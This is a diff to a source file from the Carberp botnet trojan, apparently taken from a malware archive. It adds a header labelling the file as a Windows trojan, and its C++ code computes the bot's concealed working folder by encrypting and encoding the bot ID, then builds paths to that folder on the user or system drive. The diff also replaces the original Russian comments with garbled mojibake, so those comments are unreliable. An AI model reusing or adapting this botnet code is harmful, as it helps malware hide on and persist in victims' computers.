@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 #include <shlobj.h>
 #include "BotCore.h"
@@ -20,12 +31,12 @@ DWORD BotWorkPathHash = 0;
 PCHAR BotGetWorkFolder()
 {
 	
-	// Функция возвращает рабочий каталог бота (короткое имя)
-	// Имя папки получаем из уида бота, который прогоняется ключём шифрования
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ)
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!STR::IsEmpty(BOT_WORK_FOLDER_NAME))
 		return BOT_WORK_FOLDER_NAME;
 
-	// Получаем уид и шифруем его
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	PCHAR UID = GenerateBotID();
 
     PCHAR Password = GetMainPassword(true);
@@ -36,30 +47,30 @@ PCHAR BotGetWorkFolder()
 	LPBYTE Encrypted = RC2Crypt::WinEncode((LPBYTE)UID, BufSize, Password, (PCHAR)IV);
 	PCHAR B64 = BASE64::Encode(Encrypted, BufSize);
 
-	// Исправляем некоторые символе в результате
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	for (PCHAR S = B64; *S != 0; S++)
     {
 		if (*S == '/')
-			*S = 'z';  // недопустимый символ
+			*S = 'z';  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		else
 		if (*S == '+')
-			*S = 'v';  // Редко встречается в названиях, не мозолим глаза :))
+			*S = 'v';  // пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ :))
 	}
 
-	// Копируем строку
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD MCopy = MAX_BOT_WORK_FOLDER_LEN;
 	if (MCopy > STR::Length(B64))
 		MCopy = STR::Length(B64);
 
 	STR::Copy(B64, BOT_WORK_FOLDER_NAME, 0, MCopy);
 
-	// Уничтожаем промежуточные данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	STR::Free(Password);
 	STR::Free(UID);
 	MemFree(Encrypted);
 	STR::Free(B64);
 
-	// Расчитываем хэш
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	BotWorkPathHash = CalcHash(BOT_WORK_FOLDER_NAME);
 
 	return BOT_WORK_FOLDER_NAME;
@@ -68,7 +79,7 @@ PCHAR BotGetWorkFolder()
 
 PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
 {
-	// Функция возвращает рабочий каталог бота
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 	PCHAR Path = STR::Alloc(MAX_PATH);
 
@@ -78,7 +89,7 @@ PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
 
 	if (InSysPath)
 	{
-		// Получаем путь в системной папке
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		PCHAR Tmp = STR::Scan(Path, ':');
 		if (Tmp == NULL)
 			return NULL;
@@ -87,9 +98,9 @@ PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
 	}
 
 
-    PCHAR WorkPath = BotGetWorkFolder(); // резервируем на будущее
+    PCHAR WorkPath = BotGetWorkFolder(); // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// Добавляем основной путь
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	StrConcat(Path, "\\");
 	StrConcat(Path, WorkPath);
 
@@ -98,7 +109,7 @@ PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
 
 	StrConcat(Path, "\\");
 
-	// Добавляем подиректорию
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!STR::IsEmpty(SubDir))
 	{
 		StrConcat(Path, SubDir);
@@ -115,7 +126,7 @@ PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
 
 PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
 {
-	//  Функция возвращает рабочий путь бота
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
     return BOTDoGetWorkPath(false, SubDir, FileName);
 
 }
@@ -123,16 +134,16 @@ PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
 
 PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
 {
-	//  Аналог функции GetWorkPath.
-	//  Главное от личие от нёэ в том, что пусть
-	//   создаётся в корне системного диска
+	//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ GetWorkPath.
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	//   пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
     return BOTDoGetWorkPath(true, SubDir, FileName);
 }
 //----------------------------------------------------------------------------
 
 DWORD BOT::GetWorkFolderHash()
 {
-	//  Функция возвращает хэш имени рабочей папки
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	BotGetWorkFolder();
 	return BotWorkPathHash;
 }
